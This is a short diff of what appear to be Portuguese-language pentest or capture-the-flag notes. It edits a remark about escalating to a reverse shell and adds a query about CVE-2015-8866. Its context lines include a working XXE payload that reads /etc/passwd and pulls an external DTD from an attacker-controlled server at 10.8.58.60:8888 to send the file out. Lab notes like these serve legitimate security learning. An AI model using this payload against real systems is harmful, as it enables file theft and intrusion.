@@ -118,7 +118,7 @@ Host: 10.8.58.60:8888
 
 -----
 
-Com este payload estou recebendo a request em meu python server, preciso evoluir isto para algum tipo de shell, para então conseguir o reverse shell
+Com este payload estou recebendo a request em meu python server, preciso tentar evoluir para um reverse shell.
 #+begin_src sh
 <?xml version="1.0" ?><!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % dtd SYSTEM "http://10.8.58.60:8888/p.dtd"> %dtd; %error; ]><foo></foo>
 #+end_src
@@ -255,3 +255,6 @@ RewriteRule ^api/$ /index.php/api [L,QSA]%
   </Passwords>
 </UserData>
 #+end_src
+
+
+ CVE-2015-8866 ??
